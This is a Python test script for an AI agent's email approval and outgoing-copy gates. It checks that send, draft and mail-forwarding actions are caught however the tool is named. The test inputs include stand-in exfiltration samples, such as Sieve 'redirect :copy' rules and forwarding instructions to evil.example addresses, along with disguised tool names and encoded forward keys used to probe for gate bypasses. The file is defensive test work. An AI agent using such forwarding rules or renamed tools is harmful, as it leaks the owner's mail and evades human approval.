#!/usr/bin/env python3
"""graph-forward N1b (spec G1-G7): mail tools are recognised by their ACTION, not by a list of names.

The gap this closes (spec T10): the gates recognised mail tools by a fixed list of NAMES, so a send
under any other name -- mcp__gmail-v2__v2_send_draft, __v2_reply_all, __replyAll -- reached the hooks
through the "[Gg]mail" matcher and left with exit 0: no approval, no copy audit. This file drives the
two python gates (the main agent's email approval gate and the outgoing copy gate) with the shared
vectors in scripts/hooks/mail-tool-action-cases.json; the sub-agent JS gate runs the same vectors in
src/__tests__/mail-tool-action-conformance.test.ts.

Proven here:
  - the classifier (email_extract.mail_tool_action) on every case and every classifier edge (G1-G4);
  - approval gate: a send is in scope (level 1 denies), a draft or a read is not; level 3 passes all;
  - copy gate: a send and a draft are audited (an em dash blocks), a read passes, a send with no
    readable text blocks, a draft-path call with no text passes (labels, filters);
  - G5: a stored draft sent by id is "nem horgonyozhato" at level 2 even with a body in the call; a
    reply with only a messageId is anchored on it, the approval is one-shot and does not carry over to
    another message;
  - the pinned helper scripts/approval-envelope.py (unchanged) still builds today's send, and exits 2
    with an empty stdout on v2_send_draft;
  - the call forms the pinned helper and the golden rely on: gate._SEND_TOOL.search(tool) and
    email_extract.CONNECTOR_SEND_RE (G6);
  - fail-closed on a disposable copy: a broken or an old email_extract.py turns an unlisted MCP tool
    into a deny in both gates, and leaves the Bash path as it was.

Run: python3 <thisfile>   Exit 0 = all pass.
"""
import hashlib
import importlib.util
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(os.path.dirname(HERE))
HOOKS = os.path.join(ROOT, "scripts", "hooks")
GATE = os.path.join(HOOKS, "email-approval-gate.py")
COPY = os.path.join(HOOKS, "outgoing-copy-gate.py")
HELPER = os.path.join(ROOT, "scripts", "approval-envelope.py")
with open(os.path.join(HOOKS, "mail-tool-action-cases.json"), encoding="utf-8") as _fh:
    VECTORS = json.load(_fh)
CASES = VECTORS["cases"]
EDGES = VECTORS["classifier_edges"]
AS_CLASS = {"send": "send", "draft": "draft", "nonsend": None}
EM_DASH = chr(0x2014)
NBSP = chr(0xA0)
DOTTED_I = chr(0x130)  # lower() of it is NOT one ASCII letter
# Vector class 'draft', ranked a send by the stricter name classifier (Brainy 4952).
STRICTER_THAN_VECTOR = {"mcp__gmail__create_draft_reply"}
NOW_S = "CAST(strftime('%s','now') AS INTEGER)"

failed = []


def check(name, ok, detail=""):
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" -- {detail}" if not ok and detail else ""))
    if not ok:
        failed.append(name)


def make_store(td, level):
    store = os.path.join(td, "store")
    os.makedirs(store, exist_ok=True)
    with open(os.path.join(store, "autonomy-config.json"), "w", encoding="utf-8") as fh:
        json.dump({"version": 1, "categories": [
            {"key": "email_send", "label": "Email", "level": level, "locked": False}]}, fh)
    with open(os.path.join(store, "rules.json"), "w", encoding="utf-8") as fh:
        json.dump({"no_name_rule": True, "no_name_rule_reason": "mail-tool-action test"}, fh)
    con = sqlite3.connect(os.path.join(store, "claudeclaw.db"))
    con.execute("""
      CREATE TABLE approvals (
        id TEXT PRIMARY KEY, agent_id TEXT NOT NULL, category TEXT NOT NULL,
        action_description TEXT NOT NULL, action_payload TEXT,
        status TEXT NOT NULL DEFAULT 'pending',
        timeout_at INTEGER, telegram_message_id INTEGER,
        requested_at INTEGER NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),
        resolved_at INTEGER, resolved_by TEXT,
        content_hash TEXT, consumed_at INTEGER)""")
    con.commit()
    con.close()
    return store


def approve(store, anchor, approval_id="appr-1"):
    con = sqlite3.connect(os.path.join(store, "claudeclaw.db"))
    con.execute(
        "INSERT INTO approvals (id, agent_id, category, action_description, status,"
        " requested_at, resolved_at, resolved_by, content_hash, consumed_at)"
        f" VALUES (?, 'marveen', 'email_send', 'test', 'approved', {NOW_S}-60, {NOW_S}, 'owner', ?, NULL)",
        (approval_id, anchor))
    con.commit()
    con.close()


def run(script, store, tool, ti):
    env = dict(os.environ,
               EMAIL_APPROVAL_GATE_STORE=store,
               EMAIL_APPROVAL_WINDOW_S="1800",
               OUTGOING_COPY_GATE_RULES=os.path.join(store, "rules.json"))
    p = subprocess.run([sys.executable, "-I", script],
                       input=json.dumps({"tool_name": tool, "tool_input": ti}).encode("utf-8"),
                       capture_output=True, env=env, timeout=60)
    return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")


def run_helper(tool, ti):
    p = subprocess.run([sys.executable, "-I", HELPER, "--agent", "marveen"],
                       input=json.dumps({"tool_name": tool, "tool_input": ti}).encode("utf-8"),
                       capture_output=True, timeout=60)
    return p.returncode, p.stdout.decode("utf-8", "replace"), p.stderr.decode("utf-8", "replace")


ANCHOR_RE = re.compile(r"Tartalom-horgony \(sha256[^)]*\): ([0-9a-f]{64})")


def anchor_from(err):
    m = ANCHOR_RE.search(err)
    return m.group(1) if m else None


def hand_anchor(to, text, cc=()):
    """The anchor computed here, NOT by the gate: sha256 over the canonical {to, cc, text} JSON."""
    canon = json.dumps({"cc": list(cc), "text": text, "to": list(to)},
                       ensure_ascii=False, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(canon.encode("utf-8")).hexdigest()


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def is_channel(tool):
    return tool.startswith("mcp__plugin_")


def has_text(ti):
    return any(str(ti.get(f) or "").strip() for f in
               ("body", "text", "html", "htmlBody", "message", "subject", "content", "forwardText"))


def attempt(fn):
    """Run one probe; a missing function or a crash is a failed check (RED), not an aborted run."""
    try:
        return fn()
    except Exception as exc:
        return f"{type(exc).__name__}: {exc}"


def mk_ex(inert=(), name=(), file=()):
    """A tool-class exemption: normalised key names, as _has_forward_key_name takes it (card ea9215f6)."""
    return {"inert": frozenset(inert), "name": frozenset(name), "file": frozenset(file)}


with tempfile.TemporaryDirectory(prefix="mta-") as td:
    os.environ["EMAIL_APPROVAL_GATE_STORE"] = make_store(os.path.join(td, "inproc"), 2)
    os.environ["OUTGOING_COPY_GATE_RULES"] = os.path.join(os.environ["EMAIL_APPROVAL_GATE_STORE"], "rules.json")
    sys.path.insert(0, HOOKS)
    import email_extract as ee  # noqa: E402
    gate = load("mta_approval_gate", GATE)

    # --- 1. the classifier, cases and edges (G1-G4) --------------------------
    print("classifier")
    for c in CASES:
        got = ee.mail_tool_action(c["tool"])
        check(f"{c['tool']} -> {c['expected']}", got == AS_CLASS[c["expected"]], f"got {got!r}")
    for e in EDGES:
        # an edge with an "input" is the input-aware call (create_rule / create_filter)
        got = ee.mail_tool_action(e["tool"], e["input"]) if "input" in e else ee.mail_tool_action(e["tool"])
        check(f"edge {e['tool']!r} {e.get('input', '')!r} -> {e['expected']} ({e['note']})", got == e["expected"], f"got {got!r}")
    # the forward-key walk is bounded and fail-closed (twin: hasForwardKey in the JS gate)
    deep = {"a": 1}
    for _ in range(40):
        deep = {"n": deep}
    check("walk: too deep counts as a forward key", ee._has_forward_key(deep) is True)
    check("walk: too many nodes counts as a forward key", ee._has_forward_key({"l": list(range(6000))}) is True)
    check("walk: clean nested input has none", ee._has_forward_key({"l": [1, 2, {"x": "y"}]}) is False)
    check("walk: a non-container input cannot be read: forward key", ee._has_forward_key("forward") is True and ee._has_forward_key(None) is True)
    check("walk: key case-insensitive, any value", ee._has_forward_key({"A": [{"ForwardTo": None}]}) is True)
    check("create_rule: no input argument = name only = draft", ee.mail_tool_action("mcp__gmail__create_rule") == "draft")
    # card 6151bb4d r2 B3: the five forwarding shapes, in the walk and in the classifier
    for label, inp in (
            ("stringified JSON with a forward key", {"body": json.dumps({"forwardTo": "x"})}),
            ("stringified JSON, key hidden by a unicode escape", {"body": '{"\\u0066orwardTo": 1}'}),
            ("double-encoded JSON", {"body": json.dumps(json.dumps({"redirectTo": 1}))}),
            ("Sieve redirect text", {"script": 'require ["copy"]; redirect :copy "x@y.hu";'}),
            ("actions list with type forward", {"actions": [{"type": "forward", "address": "x@y.hu"}]}),
            ("autoForward key", {"actions": {"autoForward": "x@y.hu"}}),
            ("dotted action.forward key", {"action.forward": "x@y.hu"})):
        check(f"walk: {label} is forwarding", ee._has_forward_key(inp) is True)
        check(f"create_filter + {label} is a send", ee.mail_tool_action("mcp__gmail__create_filter", inp) == "send")
    check("walk: label-only filter is clean", ee._has_forward_key({"criteria": {"subject": "invoice"}, "action": {"addLabelIds": ["L1"]}}) is False)
    check("walk: unparseable JSON-looking string is just a string", ee._has_forward_key({"b": "{not json"}) is False)
    check("walk: over-long JSON-looking string is forwarding", ee._has_forward_key({"b": "{" + "a" * 100001}) is True)
    check("walk: parse that blows the stack is forwarding", ee._has_forward_key({"b": "[" * 200000 + "]" * 200000}) is True)
    check("mail_rule_forward: name only is False", ee.mail_rule_forward("mcp__gmail__create_rule") is False)
    check("mail_rule_forward: create_label with forwardTo is True (name-independent, card 3d6e5181 N3; was False under the closed list)", ee.mail_rule_forward("mcp__gmail__create_label", {"forwardTo": "x"}) is True)
    check("mail_rule_forward: create_label with a clean input is False", ee.mail_rule_forward("mcp__gmail__create_label", {"name": "X"}) is False)
    check("mail_rule_forward: slack server is no mail", ee.mail_rule_forward("mcp__slack__create_rule", {"forwardTo": "x"}) is False)
    check("the case list holds every G7 class", {c["expected"] for c in CASES} == {"send", "draft", "nonsend"})

    # --- 1b. card 3d6e5181 N3: the name-independent forwarding rule ------------
    print("name-independent forwarding rule")
    NI = VECTORS["name_independent"]
    bad_fwd = bad_reader = bad_clean = bad_reader_fwd = 0
    for s in NI["servers"]:
        for nm in NI["forward_names"] + NI["disguised_names"]:
            for f in NI["forward_shapes"]:
                t = f"mcp__{s}__{nm}"
                if ee.mail_tool_action(t, f["input"]) != "send" or ee.mail_rule_forward(t, f["input"]) is not True:
                    bad_fwd += 1
        for nm in NI["reader_names"]:
            for f in NI["reader_inputs"] + NI["reader_benign_inputs"]:
                t = f"mcp__{s}__{nm}"
                if ee.mail_tool_action(t, f["input"]) is not None or ee.mail_rule_forward(t, f["input"]) is not False:
                    bad_reader += 1
            # card 1239a7ad: a reader is a reader only while its input has no forward / redirect KEY
            for f in NI["reader_forward_key_inputs"]:
                t = f"mcp__{s}__{nm}"
                if ee.mail_tool_action(t, f["input"]) != "send" or ee.mail_rule_forward(t, f["input"]) is not True:
                    bad_reader_fwd += 1
    for c in NI["clean"]:
        if ee.mail_tool_action(c["tool"], c["input"]) != c["expected"] or ee.mail_rule_forward(c["tool"], c["input"]) is not False:
            bad_clean += 1
            print("   clean case differs:", c["tool"], c["note"])
    n_fwd = len(NI["servers"]) * (len(NI["forward_names"]) + len(NI["disguised_names"])) * len(NI["forward_shapes"])
    check(f"{n_fwd} forward calls (servers x names x shapes) are a send via mail_rule_forward", bad_fwd == 0, f"{bad_fwd} differ")
    check("readers stay None while the input has no forward KEY (a forward word in a value is exempt)", bad_reader == 0, f"{bad_reader} differ")
    check("card 1239a7ad AC1/AC3/AC5: a reader with a forward / redirect KEY is a send via mail_rule_forward (gateway body, JSON string, gmail filter, FPK over-block)",
          bad_reader_fwd == 0, f"{bad_reader_fwd} differ")
    check("card 1239a7ad AC3: the named gateway readers deny the gateway forward body",
          all(ee.mail_tool_action(t, NI["reader_forward_key_inputs"][1]["input"]) == "send"
              for t in ("mcp__outlook__fetch", "mcp__outlook__query", "mcp__gmail__get_filter")))
    over = {"a": 1}
    for _ in range(40):
        over = {"n": over}
    check("card 1239a7ad AC6: on a reader name a non-object input and the walk limits fail closed, [] and {} stay allowed",
          all(ee.mail_tool_action(t, v) == "send"
              for t in ("mcp__outlook__get_rules", "mcp__gmail__get_filter", "mcp__outlook__fetch")
              for v in ("x", over, {"l": list(range(6000))}, {"b": "{" + "a" * 100001}))
          and all(ee.mail_tool_action(t, v) is None
                  for t in ("mcp__outlook__get_rules", "mcp__gmail__get_filter", "mcp__outlook__fetch") for v in ({}, [])))
    check("clean non-reader calls and prose drafts keep their class", bad_clean == 0, f"{bad_clean} differ")
    bad_n4 = [c["tool"] for c in NI["reviewer_n4"]
              if ee.mail_tool_action(c["tool"], c["input"]) != "send" or ee.mail_rule_forward(c["tool"], c["input"]) is not True]
    check("N4 B2: the reviewer's 5 rule / script / filter inputs (Sieve redirect, forward instruction, fwd) are a send", not bad_n4, f"{bad_n4}")
    strict = lambda v: ee._has_forward_key_name(v, True, True)
    check("N4 B2: the whole word test reads free text only for a non-draft tool (strict)",
          strict({"content": 'redirect :copy "x@evil.example";'}) and strict({"description": "forward every message to x@evil.example"})
          and strict({"body": "FWD: all mail to x@evil.example"})
          and not ee._has_forward_key_name({"content": 'redirect :copy "x@evil.example";'}, True, False)
          and not ee._has_forward_key_name({"body": "please forward this to x@y.example"}, True, False))
    # card 61fcac1e: the narrow patterns are gone; these three, which they let through (a forward word with no address
    # near it, a forward word more than 40 characters from the address, `redirect` with no quoted address), now deny in
    # strict mode: any forward word counts. straightforward and label / folder identifiers stay out.
    # card ea9215f6: no key is inert for every tool any more; a label / folder identifier is word-tested unless a tool CLASS frees it.
    check("N4 B2 (61fcac1e, ea9215f6): strict mode denies a bare forward word, a distant address and an unquoted redirect; straightforward stays out; a label / folder identifier has no exemption without a tool class",
          strict({"description": "forward looking statement, mail me at some point"}) and strict({"body": "forward " + "a" * 41 + " x@y.example"})
          and strict({"body": 'redirect x@y.example'}) and not strict({"body": "straightforward x@y.example"})
          and strict({"folder": "forward to x@evil.example"}) and strict({"addLabelIds": ["fwd x@evil.example"]}))
    check("N4 B2: plain draft vs rule / script / settings class",
          ee._is_plain_draft(["create_draft"], ["draft"]) and not ee._is_plain_draft(["update_settings"], ["draft"])
          and not ee._is_plain_draft(["manage_rules"], [None]) and not ee._is_plain_draft(["update_sieve_script"], ["draft"])
          and not ee._is_plain_draft(["create_forwarding_address"], ["draft"]))
    check("N4 B2: fwd is a value word", ee._has_forward_key_name({"action": "fwd"}) and not ee._has_forward_key_name({"x": "offwd"}))
    check("D-B2: update_auto_forwarding with a forwardTo is a send on outlook, ms365, claude_ai_Outlook",
          all(ee.mail_tool_action(f"mcp__{s}__update_auto_forwarding", {"forwardTo": "x"}) == "send" for s in ("outlook", "ms365", "claude_ai_Outlook")))
    check("6151bb4d rule keeps counting a bare address for a filter name", ee.mail_tool_action("mcp__gmail__create_filter", {"criteria": {"from": "x@y.hu"}}) == "send")
    check("a bare address does NOT count for a name-independent tool (Q4)", ee.mail_tool_action("mcp__imap__move_message", {"messageId": "<abc@host>"}) is None)
    check("channel plugin and ms365 chat are out of scope", ee.mail_tool_action("mcp__plugin_telegram_telegram__edit_message", {"forwardTo": "x"}) is None
          and ee.mail_tool_action("mcp__ms365__send-chat-message", {"forwardTo": "x"}) is None)
    check("non-object input: a non-reader is a send (fail-closed), and so is a reader (card 1239a7ad AC6; was None under 3d6e5181 AC11)",
          ee.mail_tool_action("mcp__outlook__manage_rules", "x") == "send" and ee.mail_tool_action("mcp__outlook__get_rules", "x") == "send")
    reads = lambda n: ee._is_read_action(n.split("__"))
    check("_is_read_action: readers", all(reads(n) for n in ("get_rules", "list_rules", "getrules", "search_emails", "v2_get_settings", "read_email",
          "listEmails", "export_rules", "watch_mailbox", "search_address_book", "describe_filter", "fetch_message")))
    check("_is_read_action: writes, disguised writes, unknown verbs", not any(reads(n) for n in ("get_or_create_rule", "list_and_forward",
          "searchAndForward", "manage_rules", "define_rule", "frobnicate_rules", "rules", "get_and_purge", "list_then_move", "v2_manage_rules", "update_settings")))
    hk = ee._has_forward_key_name
    check("_has_forward_key_name: keys at any depth and in JSON strings", hk({"a": [{"B": {"ForwardTo": 1}}]}) and hk({"body": '{"forwardTo":"x"}'}))
    check("_has_forward_key_name: words in non-free values (incl. a non-free key that merely contains 'name')",
          hk({"type": "forward"}) and hk({"script": 'redirect :copy "x"'}) and hk({"actionName": "forward"}) and hk({"x": "autoForward"}))
    check("_has_forward_key_name: prose, free-text keys and bare addresses do not count",
          not hk({"x": "straightforward"}) and not hk({"body": "looking forward", "subject": "Fwd: forwarded", "message_body": "forward it"})
          and not hk({"to": "x@y.hu", "id": "<a@b>"}) and not hk({"x": "forward"}, False))
    check("_has_forward_key_name: not a container = forwarding", hk("x") is True and hk(None) is True)

    # --- 1b2. card 31d8fc36 N0 (RED first): the mail-writing API endpoint table ------------
    # A gateway tool of a mail server (a name the classifier does not know) that carries a raw API request in ANY
    # string of its input - a sending endpoint (A1-A3, any method) or a rule / settings endpoint with a writing
    # request (B1-B3) - is a send (Q1: the approval gate then REFUSES it, the real recipient sits in the raw request).
    # The rows are the `name_independent.endpoint_write` block of the shared fixture; the JS twin runs the same block
    # in src/__tests__/mail-tool-action-conformance.test.ts. Before N1/N2 the positive rows, the function and the gate
    # rows fail; the benign, residual (a-c), limits and named_unchanged rows are green.
    print("mail-writing endpoint table")
    EW = NI["endpoint_write"]

    def ew_limit(l):
        if l["kind"] == "deep":
            d = {"a": 1}
            for _ in range(l["depth"]):
                d = {"n": d}
            return d
        if l["kind"] == "wide":
            return {"list": list(range(l["n"]))}
        if l["kind"] == "long_json":
            return {"b": "{" + "a" * l["chars"]}
        return l["value"]

    mew = getattr(ee, "mail_endpoint_write", None)
    check("mail_endpoint_write exists in email_extract", callable(mew))
    check("the endpoint_write block is non-trivial: every table row A1-B3, 17 names, benign >= 18, residual with a send and a null",
          {p["row"] for p in EW["positive"]} == {"A1", "A2", "A3", "B1", "B2", "B3"} and len(EW["names"]) >= 17
          and len(EW["benign"]) >= 18 and {r["expected"] for r in EW["residual"]} == {"send", None} and len(EW["limits"]) == 4
          and len(EW["named_unchanged"]) >= 7)

    def ew_differs(rows, want_of, inp_of=lambda r: r["input"]):
        """The gateway names on which mail_tool_action differs from want_of(row); one entry per name."""
        out = []
        for t in EW["names"]:
            got = attempt(lambda: ee.mail_tool_action(t, inp_of(rows)))
            if got != want_of(rows):
                out.append(f"{t}: {got!r}")
        return out

    # AC1/AC2: every positive row is a send on every gateway name, and the forward rule keeps its place (AC5)
    for p in EW["positive"]:
        bad = ew_differs(p, lambda r: "send")
        check(f"AC1/AC2 {p['row']} {p['label']}: a send on all {len(EW['names'])} gateway names", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    # AC3: the benign corpus is no send on any gateway name
    for b in EW["benign"]:
        bad = ew_differs(b, lambda r: None)
        check(f"AC3 benign {b['label']}: not a send on any gateway name", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    # Q6: the accepted remainder
    for r in EW["residual"]:
        bad = ew_differs(r, lambda x: x["expected"])
        check(f"Q6 residual {r['label']}: {r['expected']!r} on every gateway name", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    # AC4: walk-limit overflow and a non-object fail closed (green already: the forward rule denies them first)
    for l in EW["limits"]:
        bad = ew_differs(l, lambda x: "send", inp_of=ew_limit)
        check(f"AC4 limits {l['label']}: a send on every gateway name", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    # AC5: mail_rule_forward is decided by forward keys / words alone, the table adds nothing to it: a row that declares
    # the endpoint kind (no forward word in it) is not a rule forward on any gateway name
    bad = [f"{t} {p['label']}" for t in EW["names"] for p in EW["positive"]
           if p.get("kind") == "mail-tool-send" and attempt(lambda: ee.mail_rule_forward(t, p["input"])) is not False]
    check("AC5: mail_rule_forward stays False on every endpoint row without a forward word", not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    # the function twin (AC4, AC11)
    fn_pos = [p["label"] for p in EW["positive"] if attempt(lambda: mew(p["input"])) is not True]
    fn_ben = [b["label"] for b in EW["benign"] if attempt(lambda: mew(b["input"])) is not False]
    fn_res = [r["label"] for r in EW["residual"] if attempt(lambda: mew(r["input"])) is not (r["expected"] == "send")]
    fn_lim = [l["label"] for l in EW["limits"] if attempt(lambda: mew(ew_limit(l))) is not (l["kind"] != "string_input")]
    check("mail_endpoint_write is True on every positive row", not fn_pos, f"{len(fn_pos)} differ, e.g. {fn_pos[:2]}")
    check("mail_endpoint_write is False on every benign row", not fn_ben, f"{len(fn_ben)} differ, e.g. {fn_ben[:2]}")
    check("mail_endpoint_write follows the residual class", not fn_res, f"{len(fn_res)} differ, e.g. {fn_res[:2]}")
    check("mail_endpoint_write: a walk-limit overflow is True, a non-object input is False (the forward rule already denies it)", not fn_lim, f"{len(fn_lim)} differ: {fn_lim}")
    # review E1/B1: a long run of blanks must not make the normalisation quadratic (the hook timeout is 8-10 s)
    import time
    N_SP = " " * 200000
    for label, s, want in [
        ("blanks inside a word", "a" + N_SP + "b", False),
        ("request line, blanks inside", "get a" + N_SP + "b", False),
        ("request line, blanks before the HTTP version (A1)", "post /me/sendMail" + N_SP + "http/1.1", True),
        ("blanks on both ends (A1)", N_SP + "/me/sendMail" + N_SP, True),
    ]:
        t0 = time.perf_counter()
        got = attempt(lambda: mew({"path": s}))
        ms = (time.perf_counter() - t0) * 1000
        check(f"E1/B1 cost: {label} -> {want} in under 1000 ms", got is want and ms < 1000, f"got {got!r} in {ms:.0f} ms")
    t0 = time.perf_counter()
    got = attempt(lambda: ee.mail_tool_action(EW["names"][0], {"path": "a" + N_SP + "b", "x": "/me/sendMail"}))
    ms = (time.perf_counter() - t0) * 1000
    check("E1/B1 cost: mail_tool_action on a gateway name with blanks in one field and an endpoint in another is a send in under 1000 ms",
          got == "send" and ms < 1000, f"got {got!r} in {ms:.0f} ms")
    # review B3: the whole-input cost of the endpoint walk, per call under 1000 ms
    nl = ee._FORWARD_WALK_MAX_NODES

    def node_limit(n):
        o = {"method": "get"}
        for i in range(n):
            o["k%d" % i] = "/settings/filters" + " " * 200
        return o

    for label, inp, want in [
        ("B3: one method object, 4900 B-class strings", {"method": "get" + " " * 1000000, "items": ["/settings/filters"] * 4900}, False),
        ("round-1 shapes in one input", {"a": "a" + N_SP + "b", "b": "get a" + N_SP + "b", "c": N_SP + "/me/sendMail" + N_SP}, True),
        ("node limit - 10 strings", node_limit(nl - 10), False),
        ("node limit + 10 strings (fails closed)", node_limit(nl + 10), True),
    ]:
        t0 = time.perf_counter()
        got = attempt(lambda: mew(inp))
        ms = (time.perf_counter() - t0) * 1000
        check(f"B3 cost: mail_endpoint_write, {label} -> {want} in under 1000 ms", got is want and ms < 1000, f"got {got!r} in {ms:.0f} ms")
        t0 = time.perf_counter()
        got = attempt(lambda: ee.mail_tool_action(EW["names"][0], inp))
        ms = (time.perf_counter() - t0) * 1000
        check(f"B3 cost: mail_tool_action, {label} -> {'send' if want else 'None'} in under 1000 ms",
              got == ("send" if want else None) and ms < 1000, f"got {got!r} in {ms:.0f} ms")
    # E2: the table is immutable
    check("E2: the python MAIL_ENDPOINT_TABLE is a tuple of tuples",
          isinstance(ee.MAIL_ENDPOINT_TABLE, tuple) and all(isinstance(r, tuple) and isinstance(r[2], tuple) and isinstance(r[3], tuple)
                                                             for r in ee.MAIL_ENDPOINT_TABLE))
    # AC5 / Q4: the tools the classifier names keep their class, with an endpoint form in the input
    for c in EW["named_unchanged"]:
        got = attempt(lambda: ee.mail_tool_action(c["tool"], c["input"]))
        check(f"Q4 {c['tool']}: {c['note']} (class {c['action']!r})", got == c["action"], f"got {got!r}")
    # AC6(b)/Q1: the envelope of an endpoint send is unreadable (not the "not a mail tool" reason of an unknown name)
    bad = []
    for t in EW["names"]:
        for p in EW["positive"]:
            env = attempt(lambda: ee.collect_email_envelope(t, p["input"]))
            reason = env.get("unreadable_reason") if isinstance(env, dict) else None
            if not reason or "nem email-kuldo" in str(reason):
                bad.append(f"{t} {p['label']}")
    check("AC6(b) Q1: collect_email_envelope names an unreadable_reason for every endpoint send (it is a send, not 'nem email-kuldo tool')",
          not bad, f"{len(bad)} differ, e.g. {bad[:2]}")
    # AC6(a)/Q1/Q2: the approval gate does not leave through the name prefilter, it refuses; a benign read passes
    ew1 = make_store(os.path.join(td, "ew1"), 1)
    ew2 = make_store(os.path.join(td, "ew2"), 2)
    ew3 = make_store(os.path.join(td, "ew3"), 3)
    gate_names = ("mcp__outlook__request", "mcp__ms365__call_api", "mcp__gmail__graph_request", "mcp__outlook__fetch")
    first_of = {}
    for p in EW["positive"]:
        first_of.setdefault(p["row"], p)
    for row_id, p in first_of.items():
        for t in gate_names:
            code, _, err = run(GATE, ew1, t, p["input"])
            check(f"AC6(a) approval gate L1: {t} + {row_id} {p['label']} is a send, DENIED", code == 2 and "szint 1" in err, f"exit={code} err={err[:120]!r}")
            code, _, err = run(GATE, ew2, t, p["input"])
            check(f"AC6(a) approval gate L2: {t} + {row_id} {p['label']} is REFUSED (the envelope is unreadable, Q1)", code == 2, f"exit={code} err={err[:120]!r}")
    for t in gate_names:
        code, _, err = run(GATE, ew3, t, EW["positive"][0]["input"])
        check(f"approval gate L3 passes an endpoint send, as it passes every send ({t})", code == 0, f"exit={code} err={err[:120]!r}")
    for b in EW["benign"][:6]:
        for t in gate_names:
            code, _, err = run(GATE, ew2, t, b["input"])
            check(f"AC3 approval gate L2: {t} + benign {b['label']} passes", code == 0, f"exit={code} err={err[:120]!r}")
    # AC6(c): the copy gate audits an endpoint send (a send with no readable text blocks; an em dash in the body blocks);
    # the draft log does not write it, and a draft-class tool with a table URL is still a draft for it (Q4)
    for t in gate_names:
        # positive[0] carries body.message.subject, which the copy gate reads as text; positive[1] has no text at all
        code, _, err = run(COPY, ew1, t, EW["positive"][1]["input"])
        check(f"AC6(c) copy gate: {t} endpoint send with no readable text is blocked (exit 2)", code == 2, f"exit={code} err={err[:120]!r}")
        probe = dict(EW["positive"][0]["input"])
        probe["body"] = "Próba " + EM_DASH + " vége."
        code, _, err = run(COPY, ew1, t, probe)
        check(f"AC6(c) copy gate: {t} endpoint send with an em dash in the body is audited (exit 2)", code == 2, f"exit={code} err={err[:120]!r}")
        code, _, err = run(COPY, ew1, t, EW["benign"][0]["input"])
        check(f"AC3 copy gate: {t} benign read passes (exit 0)", code == 0, f"exit={code} err={err[:120]!r}")
    dlog = attempt(lambda: load("mta_draft_log", os.path.join(HOOKS, "email-draft-log.py")))
    if isinstance(dlog, str):
        check("AC6(c) email-draft-log loads", False, dlog)
    else:
        named_draft = [c for c in EW["named_unchanged"] if c["tool"] == "mcp__gmail__create_draft"][0]
        check("AC6(c) email-draft-log: an endpoint send is not a draft call",
              all(attempt(lambda: dlog._is_draft_call(gate, t, p["input"])) is False for t in gate_names for p in EW["positive"][:6]))
        check("AC6(c) Q4 email-draft-log: a draft-class tool with a table URL in a field is still a draft call",
              attempt(lambda: dlog._is_draft_call(gate, named_draft["tool"], named_draft["input"])) is True)

    # --- 1c. card 61fcac1e N1: the free-text invariant ------------------------
    # The prose exemption belongs to a POSITIVELY identified mail tool (_is_plain_draft: draft class, a mail noun in a
    # segment, no rule / filter / script / settings / automation word); every other non-reader, non-send tool has the
    # whole word test (forward | redirect | fwd, mailto:) on every string value, except the inert keys. No syntax
    # pattern: the Sieve command name cannot be encoded. The matrices are generated from the `free_text_invariant`
    # block of the shared fixture (the 3d6e5181 reviewer set); the JS twin runs the same block in
    # src/__tests__/mail-tool-action-conformance.test.ts.
    print("free-text invariant")
    INV = NI["free_text_invariant"]
    deny_calls = []
    for t in INV["sieve_tools"]:
        for f in INV["sieve_forms"]:
            for k in INV["sieve_keys"]:
                deny_calls.append((t, {"name": "main", k: f["text"]}, f"{f['label']}/{k}"))
            deny_calls.append((t, {"name": "main", "content": json.dumps({"script": f["text"]})}, f"{f['label']}/jsonstr"))
    n_sieve = len(deny_calls)
    for n in INV["rule_like_names"]:
        for i in INV["rule_like_inputs"]:
            deny_calls.append((n, i["input"], f"{n.split('__')[2]}/{i['label']}"))
    for d in INV["deny"]:
        deny_calls.append((d["tool"], d["input"], d["note"]))
    bad = [lab for t, i, lab in deny_calls if ee.mail_tool_action(t, i) != "send" or ee.mail_rule_forward(t, i) is not True]
    check(f"T1 T2 T3 T5 T7 T8: {len(deny_calls)} calls (Sieve forms x keys x tools incl. JSON-wrapped, rule-like names, fail-closed rows) are a send and a rule-forward",
          n_sieve == len(INV["sieve_tools"]) * len(INV["sieve_forms"]) * (len(INV["sieve_keys"]) + 1) and not bad, f"{len(bad)} differ: {bad[:5]}")
    bad = [f"{t} {ins['label']}/{k}" for t in INV["sieve_tools"] for k in INV["instruction_keys"] for ins in INV["instructions"]
           if ee.mail_rule_forward(t, {k: ins["text"]}) is not ins["denied"]]
    check("F-sentences: a forward word in a rule / script / settings description denies; the F7 sentence without one stays outside (spec AC5)",
          not bad and [x["label"] for x in INV["instructions"] if not x["denied"]] == ["F7_copy"], f"{bad[:5]}")
    check("T3 T4: _is_plain_draft is positive (rule-like names and a draft verb with no mail noun are not plain)",
          all(ee._is_plain_draft([s], ["draft"]) for s in INV["plain_segments"])
          and not any(ee._is_plain_draft([s], ["draft"]) for s in INV["not_plain_segments"])
          and not ee._is_plain_draft(["create_draft"], [None])
          and ee._is_plain_draft(["server", "create_draft"], ["nonsend", "draft"])
          and not ee._is_plain_draft(["rules", "create_draft"], ["nonsend", "draft"]))
    check("R1 B1 (ea9215f6 T1): _is_label_folder_tool needs a label / folder noun AND a create / update / rename / add / move / delete / remove / modify verb, or a mailbox with create / rename / delete; a get, update_mailbox / set_mailbox and a rule / settings / forward word are not",
          all(ee._is_label_folder_tool([s]) for s in INV["label_segments"])
          and not any(ee._is_label_folder_tool([s]) for s in INV["not_label_segments"]))
    prose = {"to": ["known@example.com"], "subject": "Fwd: x", "body": "please forward this to x@y.example", "html": '<a href="mailto:x@y.example">x</a>'}
    check("T4: a plain draft keeps its prose (a forward instruction in a body is a letter, the ledger checks the recipients)",
          all(ee.mail_tool_action(n, prose) == "draft" and ee.mail_rule_forward(n, prose) is False for n in INV["plain_names"]))
